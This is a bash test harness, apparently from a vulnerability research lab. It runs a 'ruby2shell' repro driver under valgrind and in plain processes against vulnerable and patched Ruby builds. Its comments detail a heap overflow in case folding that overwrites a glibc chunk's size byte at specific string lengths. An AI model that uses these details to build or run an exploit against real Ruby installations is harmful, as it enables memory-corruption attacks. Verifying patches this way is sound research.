#!/usr/bin/env bash
# W361: fold-byte differential at the successor chunk size LSB.
# N=27/43/59 in the mixed-parity driver give R=N+45 == 8 (mod 16), the
# successor glibc chunk's size LSB. downcase(:fold) writes 0x73 there
# instead of upcase's 0x53. Runs valgrind on three vulnerable and three
# patched plain builds, then fresh unsanitized processes: ten reps per
# arm for the vulnerable builds (fold and upcase, plus an even-N safe
# control), three fold reps per patched build.
# Raw evidence is gitignored under lab/build/evidence/casemap-chain/w361/.
set -u
cd "$(dirname "$0")/../.." || exit 1
EVID=lab/build/evidence/casemap-chain/w361
DRIVER=lab/repro/ruby2shell-rung3-mixed-fold.rb
mkdir -p "$EVID/plain"

VULN=(ruby-3.4.12-plain ruby-3.3.13-plain ruby-4.0.9-plain)
FIXED=(ruby-3.4.13-plain ruby-3.3.14-plain ruby-4.0.10-plain)

if [ "${SKIP_VG:-0}" != 1 ]; then
for ver in "${VULN[@]}" "${FIXED[@]}"; do
  rb="lab/build/plain/$ver/bin/ruby"
  [ -x "$rb" ] || { echo "missing $rb" >&2; exit 2; }
  for n in 27 43 59; do
    valgrind --error-limit=no "$rb" "$DRIVER" "$n" fold >"$EVID/vg-$ver-$n.txt" 2>&1
    rc=$?
    writes=$(grep -c 'Invalid write of size 1' "$EVID/vg-$ver-$n.txt" || true)
    reads=$(grep -c 'Invalid read of size' "$EVID/vg-$ver-$n.txt" || true)
    block=$(grep -m1 -o '0 bytes after a block of size [0-9]*' "$EVID/vg-$ver-$n.txt" || true)
    site=$(grep -m1 -o 'case_map [a-z0-9_/]*\.c:[0-9]*' "$EVID/vg-$ver-$n.txt" || true)
    printf 'vg build=%s N=%s rc=%s writes=%s reads=%s %s %s\n' "$ver" "$n" "$rc" "$writes" "$reads" "$block" "$site"
  done
done
fi

for ver in "${VULN[@]}"; do
  rb="lab/build/plain/$ver/bin/ruby"
  for n in 27 43 59; do
    for op in fold upcase; do
      for i in 1 2 3 4 5 6 7 8 9 10; do
        "$rb" "$DRIVER" "$n" "$op" >"$EVID/plain/$ver-$n-$op-$i.txt" 2>&1
        rc=$?
        diag=$(grep -m1 -E 'munmap_chunk|corrupted size|invalid next size|free\(\)' "$EVID/plain/$ver-$n-$op-$i.txt" || true)
        printf 'plain build=%s N=%s op=%s i=%s rc=%s %s\n' "$ver" "$n" "$op" "$i" "$rc" "$diag"
      done
    done
  done
  for i in 1 2 3 4 5 6 7 8 9 10; do
    "$rb" "$DRIVER" 28 fold >"$EVID/plain/$ver-28-fold-$i.txt" 2>&1
    rc=$?
    diag=$(grep -m1 -E 'munmap_chunk|corrupted size|invalid next size|free\(\)' "$EVID/plain/$ver-28-fold-$i.txt" || true)
    printf 'plain build=%s N=28 fold i=%s rc=%s %s\n' "$ver" "$i" "$rc" "$diag"
  done
done

for ver in "${FIXED[@]}"; do
  rb="lab/build/plain/$ver/bin/ruby"
  for n in 27 43 59; do
    for i in 1 2 3; do
      "$rb" "$DRIVER" "$n" fold >"$EVID/plain/$ver-$n-fold-$i.txt" 2>&1
      rc=$?
      diag=$(grep -m1 -E 'munmap_chunk|corrupted size|invalid next size|free\(\)' "$EVID/plain/$ver-$n-fold-$i.txt" || true)
      printf 'plain build=%s N=%s op=fold i=%s rc=%s %s\n' "$ver" "$n" "$i" "$rc" "$diag"
    done
  done
done
